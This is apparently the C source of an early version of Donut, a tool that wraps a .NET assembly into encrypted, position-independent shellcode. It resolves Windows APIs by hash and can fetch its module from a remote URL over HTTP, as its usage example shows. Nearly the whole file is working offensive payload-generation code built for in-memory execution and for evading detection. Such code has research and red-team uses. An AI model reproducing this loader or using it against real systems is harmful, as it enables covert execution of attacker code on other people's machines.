/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

API_IMPORT api_imports[]=
{ {KERNEL32_DLL, "LoadLibraryA"},

  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  {KERNEL32_DLL, "LocalFree"},
  {KERNEL32_DLL, "FindResourceA"},
  {KERNEL32_DLL, "LoadResource"},
  {KERNEL32_DLL, "LockResource"},
  {KERNEL32_DLL, "SizeofResource"},
  
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {ADVAPI32_DLL, "CryptAcquireContextA"},
  {ADVAPI32_DLL, "CryptCreateHash"},
  {ADVAPI32_DLL, "CryptHashData"},
  {ADVAPI32_DLL, "CryptVerifySignatureA"},
  {ADVAPI32_DLL, "CryptDestroyHash"},
  {ADVAPI32_DLL, "CryptDestroyKey"},
  {ADVAPI32_DLL, "CryptReleaseContext"},
  
  {CRYPT32_DLL,  "CryptStringToBinaryA"},
  {CRYPT32_DLL,  "CryptDecodeObjectEx"},
  {CRYPT32_DLL,  "CryptImportPublicKeyInfo"},
  
  { NULL, NULL }
};

GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
GUID IID_AppDomain = 
{ 0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};

// used to convert digital signature from big-endian to little-endian
static void byte_swap(void *buf, int len) {
    int     i;
    uint8_t t, *p=(uint8_t*)buf;

    for(i=0; i<len/2; i++) {
      t = p[i];
      p[i] = p[len - 1 - i];
      p[len - 1 - i] = t;
    }
}

// returns 1 on success else <=0
EXPORT_FUNC int GenRandom(void *buf, size_t len) {
    
#if defined(_WIN32) || defined(_WIN64)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    return RAND_bytes(buf, len);
#endif
}

// digitally sign module for configuration
EXPORT_FUNC int SignModule(PDONUT_CONFIG c) {
    FILE       *fd;
    struct stat fs;
    int         ok = 0, siglen = 0;
    
    // 1. no configuration? return
    if(c == NULL) return 0;
    
    // no module? return
    if(c->mod == NULL || c->modlen == 0) return 0;
    
    // 2. no private key? return
    if(c->privkey == NULL) return 0;

    // 3. try obtain the size of private key on disk
    if(stat(c->privkey, &fs) != 0) return 0;

    // 4. file size is zero? return
    if(fs.st_size == 0) return 0;

    // 5. can't open private key for reading? return
    fd = fopen(c->privkey, "rb");
    if(fd == NULL) return 0;
    
#if defined(_WIN32) || defined(_WIN64)
    HCRYPTPROV              prov;
    HCRYPTKEY               key;
    HCRYPTHASH              hash;
    PCRYPT_PRIVATE_KEY_INFO pki = 0;
    PBYTE                   pem, keyData, derData, p;
    DWORD                   keyLen,
                            pkiLen,
                            derLen;

    // 6. try allocate memory for PEM string
    pem = (char*)malloc(fs.st_size);
    if(pem != NULL) {
      // 7. read PEM string
      fread(pem, 1, fs.st_size, fd);

      // 8. acquire crypto context
      DPRINT("Acquiring crypto context");
      ok = CryptAcquireContext(
          &prov, NULL, NULL,
          PROV_RSA_AES,
          CRYPT_VERIFYCONTEXT | CRYPT_SILENT);

      if(ok) {
        // 9. obtain space required to decode PEM string into DER binary
        derLen = 0;
        DPRINT("Calculating space required for PEM to DER conversion");
        ok = CryptStringToBinaryA(
            pem, 0, CRYPT_STRING_ANY,
            NULL, &derLen, NULL, NULL);

        // 10. allocate space for DER binary
        derData = (PBYTE)malloc(derLen);

        if(derData != NULL) {
          // 11. convert PEM string to DER binary
          DPRINT("Converting PEM to DER");
          
          ok = CryptStringToBinaryA(
              pem, 0, CRYPT_STRING_ANY,
              derData, &derLen, NULL, NULL);

          if(ok) {
            // 12. convert DER binary to private key blob
            DPRINT("Decoding DER into private key blob", derLen);
            pkiLen = 0;
            
            ok = CryptDecodeObjectEx(
                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 
                PKCS_RSA_PRIVATE_KEY,
                derData, derLen, 
                CRYPT_DECODE_ALLOC_FLAG,
                NULL, &keyData, &keyLen);

            if(ok) {
              // 13. import blob into crypto API key object
              DPRINT("Importing private key blob");
              
              ok = CryptImportKey(
                  prov, keyData, keyLen,
                  0, CRYPT_EXPORTABLE, &key);
              if(ok) {
                // 14. create a hash object
                DPRINT("Creating hash object");
                
                ok = CryptCreateHash(
                    prov, CALG_SHA_256, 0, 0, &hash);
                if(ok) {
                  // 15. hash module data
                  DPRINT("Generating hash of module data");
                  p = (PBYTE)c->mod;
                  p += DONUT_SIG_LEN + sizeof(DWORD);
                  
                  ok = CryptHashData(
                      hash, p, 
                      (DWORD)c->modlen - DONUT_SIG_LEN, 0);

                  if(ok) {
                    // 16. sign hash with private key
                    siglen = 0;
                    DPRINT("Calculating space for signature");
                    
                    ok = CryptSignHash(
                        hash, AT_KEYEXCHANGE, NULL,
                        0, NULL, (PDWORD)&siglen);
                    if(ok) {
                      if(siglen == DONUT_SIG_LEN) {
                        DPRINT("Computing signature for hash");
                        
                        ok = CryptSignHash(
                          hash, AT_KEYEXCHANGE, NULL,
                          0, (PBYTE)&c->mod->modsig, (PDWORD)&siglen);
                      }
                    }
                  }
                  CryptDestroyHash(hash);
                }
                CryptDestroyKey(key);
              }
              LocalFree(keyData);
            }
          }
          free(derData);
        }
        CryptReleaseContext(prov, 0);
      }
      free(pem);
    }
#else
    EVP_MD_CTX *md;
    EVP_PKEY   *pkey;
    uint8_t    *p;
    
    OpenSSL_add_all_digests();
    // 6. create a message digest context
    md = EVP_MD_CTX_create();

    if(md != NULL) {
      // 7. read private key into key object
      pkey = PEM_read_PrivateKey(fd, NULL, NULL, NULL);
      if(pkey != NULL) {
        // 8. obtain size of signature
        siglen = EVP_PKEY_size(pkey);
        // 9. make sure it doesn't exceed defined length
        if(siglen == DONUT_SIG_LEN) {
          // 10. initialize digest context
          if(EVP_SignInit_ex(md, EVP_sha256(), NULL)) {
            p = (uint8_t*)c->mod;
            p += DONUT_SIG_LEN + sizeof(int);
            // 11. hash module
            if(EVP_SignUpdate(md, p, c->modlen - DONUT_SIG_LEN)) {
              // 12. get signature
              ok = EVP_SignFinal(md, c->mod->modsig, &siglen, pkey);
              // 13. convert from big-endian to little-endian
              // because crypto API uses LE format
              if(ok) {
                byte_swap(c->mod->modsig, DONUT_SIG_LEN);
              }
            }
          }
        }
        EVP_PKEY_free(pkey);
      }
      EVP_MD_CTX_destroy(md);
    }
#endif
    fclose(fd);
    
    return ok;
}

// create a donut module for configuration
// returns 1 for okay, else 0
EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
    struct stat   fs;
    FILE          *fd;
    PDONUT_MODULE mod = NULL;
    size_t        len;
    char          *param;
    int           cnt;

    DPRINT("Checking configuration");
    if(c == NULL) return 0;
    
    // no file, public or private key?
    if(c->file    == NULL ||
       c->privkey == NULL ||
       c->pubkey  == NULL) return 0;

    // no file size? return
    if(stat(c->file, &fs)!=0) return 0;

    // file size is zero? return
    if(fs.st_size == 0) return 0;

    // try open assembly
    DPRINT("Opening assembly");
    fd = fopen(c->file, "rb");

    // not opened? return
    if(fd == NULL) return 0;

    // allocate memory for module information and assembly
    len = sizeof(DONUT_MODULE) + fs.st_size;
    mod = malloc(len);

    // if memory allocated
    if(mod != NULL) {
      // zero initialize memory
      memset(mod, 0, len);
      // initialize namespace/class, method and runtime version
      mbstowcs((wchar_t*)mod->cls,     c->cls,             strlen(c->cls));
      mbstowcs((wchar_t*)mod->method,  c->method,          strlen(c->method));
      mbstowcs((wchar_t*)mod->runtime, DONUT_RUNTIME_NET4, strlen(DONUT_RUNTIME_NET4));

      // if parameters specified
      if(c->param != NULL) {
        cnt = 0;
        // split by comma or semi-colon
        param = strtok(c->param, ",;");
        while(param != NULL && cnt < DONUT_MAX_PARAM) {
          DPRINT("Adding %s", param);
          // convert ansi string to wide character string
          mbstowcs((wchar_t*)mod->param[cnt++], param, strlen(param));
          // get next parameter
          param = strtok(NULL, ",;");
        }
        // set number of parameters
        mod->param_cnt = cnt;
      }
      // set length of assembly
      mod->len = fs.st_size;
      // read assembly into memory
      fread(&mod->data, 1, fs.st_size, fd);
    }
    // close assembly
    fclose(fd);
    // memory allocation failed? return
    if(mod == NULL) return 0;
    // update configuration with pointer to module
    c->mod    = mod;
    c->modlen = len;
    // try signing the module info
    DPRINT("Signing module with RSA");
    if(!SignModule(c)) {
      DPRINT("RSA signing failed");
      // if sign failed, release memory for module and return zero
      free(c->mod);
      c->mod    = NULL;
      c->modlen = 0;
      return 0;
    }
    return 1;
}

// create a donut instance for configuration
// returns 1 for okay, else 0
EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst = NULL;
    int             cnt, i;
    FILE            *fd;
    struct stat     fs;
    uint64_t        ulDllHash, rnd;
    size_t          instlen = 0;
    uint8_t         *data;
    
    // no configuration? return
    if(c == NULL) return 0;
    
    // no module? return
    if(c->mod == NULL) return 0;
    
    // calculate the size of instance based on type
    DPRINT("Allocating space for instance");
    instlen = sizeof(DONUT_INSTANCE);
    
    // if this is a PIC instance, add the size of module
    // which will be appended to the end of data
    if(c->type == DONUT_INSTANCE_PIC) {
      DPRINT("The size of module is %i bytes. Adding to size of instance.", 
        c->modlen);
      instlen += c->modlen;
    }
    inst = (PDONUT_INSTANCE)malloc(instlen);
    if(inst == NULL) return 0;
    
    // generate a random IV for maru hash
    DPRINT("Generating random IV for Maru hash");
    if(!GenRandom(&inst->ulIV, MARU_IV_LEN)) return 0;

    // generate a random key and counter to encrypt instance
    DPRINT("Generating random key for instance");
    if(!GenRandom(&inst_key, sizeof(DONUT_CRYPT))) return 0;
    memcpy(&inst->Key, &inst_key, sizeof(DONUT_CRYPT));

    // generate a random key and counter to encrypt module
    DPRINT("Generating random key for module");
    if(!GenRandom(&mod_key, sizeof(DONUT_CRYPT))) return 0;
    memcpy(&inst->ModuleKey, &mod_key, sizeof(DONUT_CRYPT));
    
    // generate a random 8 character name for the module
    if(!GenRandom(&rnd, sizeof(rnd)));
    for(i=0;i<8;i++) {
      c->modname[i] = (rnd % 26) + 'a';
      rnd >>= 2;
    }
    // copy GUID structures
    DPRINT("Copying GUID structures to instance");
    memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
    memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
    memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
    memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
    memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
    memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));

    // require API from four different libraries
    inst->DllCount = 5;

    // copy DLL strings required by API
    strcpy(inst->szDll[0], "mscoree.dll" );
    strcpy(inst->szDll[1], "oleaut32.dll");
    strcpy(inst->szDll[2], "crypt32.dll" );
    strcpy(inst->szDll[3], "advapi32.dll");
    strcpy(inst->szDll[4], "wininet.dll");

    // create hashes for API strings
    DPRINT("Generating hashes for API using IV: %p", (void*)inst->iv);
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      ulDllHash = maru(api_imports[cnt].module, inst->ulIV);
      //DPRINT("DLL hash for %s is %p", api_imports[cnt].module, (void*)ulDllHash);
      // calculate hash for API string and add to DLL hash, then store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->ulIV) + ulDllHash;
      //DPRINT("API hash for %s is %p", api_imports[cnt].name, (void*)inst->api.hash[cnt]);
    }
    // set how many addresses to resolve
    inst->ApiCount = cnt;

    // set the type of instance we're creating
    inst->dwType = c->type;

    // if the module will be downloaded
    // set the URL parameter and request verb
    if(c->type == DONUT_INSTANCE_URL) {
      strcpy(inst->TypeInfo.http.url, c->url);
      strcat(inst->TypeInfo.http.url, c->modname);
      strcpy(inst->TypeInfo.http.req, "GET");
    }
    // if the module will be loaded from the resource section
    // set the name and type
    else if(c->type == DONUT_INSTANCE_DLL) {
      strcpy(inst->TypeInfo.resource.name, c->modname);
      strcpy(inst->TypeInfo.resource.type, "RCDATA");
    }

    // obtain the size of public key
    DPRINT("Storing public key");
    if(stat(c->pubkey, &fs) != 0) return 0;

    // return on invalid size
    if(fs.st_size == 0 || fs.st_size > DONUT_PUBKEY_LEN) return 0;

    // try open public key for reading
    fd = fopen(c->pubkey, "rb");
    if(fd == NULL) return 0;
    // store public key in instance
    fread(inst->pubkey, 1, DONUT_PUBKEY_LEN, fd);
    fclose(fd);

    
    inst->ModuleLen = c->modlen;
    
    c->inst     = inst;
    c->instlen  = instlen;
    inst->dwLen = instlen - (sizeof(DONUT_CRYPT) + sizeof(DWORD));
    
    // if PIC, copy module to instance
    if(c->type == DONUT_INSTANCE_PIC) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->Assembly.x, c->mod, c->modlen);
    }
    data = (uint8_t*)c->inst;
    data += sizeof(DONUT_CRYPT) + sizeof(DWORD);
    
    // encrypt instance
    encrypt(inst_key.key, inst_key.ctr, data, inst->dwLen);
    
    return 1;
}
  
// given a configuration, create a PIC that will run from anywhere in memory
EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
    FILE     *pfd, *fd;
    void     *pld;
    uint8_t  *pl;
    char     *plfile;
    struct   stat fs;
    
    // 
    if(c->arch == DONUT_ARCH_X86) {
      DPRINT("using x86");
      plfile = "payload.exe32.bin";
    } else {
      DPRINT("using amd64");
      plfile = "payload.exe64.bin";
    }
    
    // 1. stat payload
    DPRINT("stat(%s)", plfile);
    if(stat(plfile, &fs) != 0) {
      return DONUT_ERROR_PAYLOAD_MISSING;
    }
    // 2. payload is zero?
    if(fs.st_size == 0) {
      return DONUT_ERROR_PAYLOAD_INVALID;
    }
    // 3. attempt to open payload
    DPRINT("fopen(%s)", plfile);
    pfd=fopen(plfile, "rb");
    
    if(pfd==NULL) {
      return DONUT_ERROR_PAYLOAD_ACCESS;
    }
    // 4. allocate memory for payload
    pld=malloc(fs.st_size);
    
    if(pld!=NULL) {
      // 5. read payload into memory
      fread(pld, 1, fs.st_size, pfd);
      // 6. create the module
      DPRINT("Creating module");
      
      if(CreateModule(c)) {
        // 7. create the instance
        DPRINT("Creating instance");
        
        if(CreateInstance(c)) {
          // if DEBUG is defined, save instance to disk
          #ifdef DEBUG
            DPRINT("Saving instance to file");
            fd=fopen("instance", "wb");
            
            if(fd != NULL) {
              fwrite(c->inst, 1, c->instlen, fd);
              fclose(fd);
            }
          #endif
          // 8. if this module will be stored on a remote server
          if(c->type == DONUT_INSTANCE_URL) {
            // save module to disk
            fd=fopen(c->modname, "wb");
            
            if(fd != NULL) {
              fwrite(c->mod, 1, c->modlen, fd);
              fclose(fd);
            }
          }
          // 9. calculate size of PIC + instance combined
          // allow additional space for some x86/amd64 opcodes
          c->payloadlen = fs.st_size + c->instlen + 16;
          c->payload    = malloc(c->payloadlen);
          pl            = (uint8_t*)c->payload;
          
          // for now, only x86 and amd64 are supported.
          // since the payload is written in C, 
          // adding support for ARM64 shouldn't be difficult
          if(pl != NULL) {
            // if DEBUG is defined
            #ifdef DEBUG
              *pl++ = 0xCC;                   // insert int3
            #endif
            *pl++ = 0xE8;                     // insert call
            ((uint32_t*)pl)[0] = c->instlen;  // insert offset to executable code
            pl += sizeof(uint32_t);           // skip 4 bytes used for offset
            // copy the instance (plus the module if attached)
            memcpy(pl, c->inst, c->instlen);  
            pl += c->instlen;                 // skip instance
            // we use fastcall convention for 32-bit code.
            // microsoft fastcall is used by default for 64-bit code.
            // the pointer to instance is placed in ecx/rcx
            *pl++ = 0x59;                     // insert pop ecx / pop rcx
            // copy the assembly code
            memcpy(pl, pld, fs.st_size);
          }
        }
      }
    }
    return DONUT_ERROR_SUCCESS;
}

EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
    
    if(c == NULL) return 0;
    
    // free module
    if(c->mod != NULL) {
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      free(c->inst);
      c->inst = NULL;
    }
    // free payload
    if(c->payload != NULL) {
      free(c->payload);
      c->payload = NULL;
    }
    return 1;
}

// define when building an executable
#ifdef DONUT_EXE

char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

void usage (void) {
    printf("\n  usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>\n\n");
    printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
    printf("       -u <URL>             HTTP server hosting the .NET assembly.\n");
    
    printf("       -c <namespace.class> The assembly class name.\n");
    printf("       -m <method>          The assembly method name.\n");
    printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");

    printf(" examples:\n\n");
    printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
    printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i;
    FILE         *fd;
    char         *arch_str[2]={"x86","AMD64"};
    char         *inst_type[3]={"PIC","URL","DLL"};
    
    printf("\n  [ Donut .NET Loader v0.1");
    printf("\n  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default type is position independent code
    c.type    = DONUT_INSTANCE_PIC;
    c.arch    = DONUT_ARCH_AMD64;
    
    c.privkey = "private.pem";
    c.pubkey  = "public.pem";
    
    // parse arguments
    for(i=1;i<argc;i++) {
      if(argv[i][0] == '-' || argv[i][0] == '/') {
        opt = argv[i][1];
        switch(opt) {
          // target cpu architecture
          case 'a':
            c.arch   = atoi(get_param(argc, argv, &i));
            break;
          // assembly to use
          case 'f':
            c.file   = get_param(argc, argv, &i);
            break;
          // url of remote assembly
          case 'u': {
            c.url    = get_param(argc, argv, &i);
            c.type   = DONUT_INSTANCE_URL;
            break;
          }
          // class
          case 'c':
            c.cls    = get_param(argc, argv, &i);
            break;
          // method
          case 'm':
            c.method = get_param(argc, argv, &i);
            break;
          // parameters to method
          case 'p':
            c.param  = get_param(argc, argv, &i);
            break;
          default:
            usage();
            break;
        }
      }
    }
    
    // no file?
    if(c.file == NULL) {
      printf("  [ no .NET assembly specified.\n");
      usage();
    }
    
    // no class or method?
    if(c.cls == NULL || c.method == NULL) {
      printf("  [ no class or method specified.\n");
      usage();
    }
    
    if(c.arch != DONUT_ARCH_X86 && 
       c.arch != DONUT_ARCH_AMD64)
    {
      printf("  [ invalid architecture specified.\n");
      usage();
    }
    
    printf("  [ Instance Type : %s\n", inst_type[c.type]);
    printf("  [ .NET Assembly : %s\n", c.file  );
    printf("  [ Class         : %s\n", c.cls   );
    printf("  [ Method        : %s\n", c.method);
    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);

    printf("\n  [ Creating payload...");
    
    if(CreatePayload(&c) == DONUT_ERROR_SUCCESS) {
      printf("ok.\n");
      if(c.type == DONUT_INSTANCE_URL) {
        printf("  [ Module name   : %s\n", c.modname);
        printf("  [ Upload to     : %s\n", c.url);
      }
      printf("  [ Saving to disk...");
      fd=fopen("payload.bin", "wb");
      if(fd!=NULL) {
        fwrite(c.payload, 1, c.payloadlen, fd);
        fclose(fd);
        printf("ok.\n");
      } else {
        printf("failed.\n");
      }
      ReleasePayload(&c);
    }
    return 0;
}
#endif
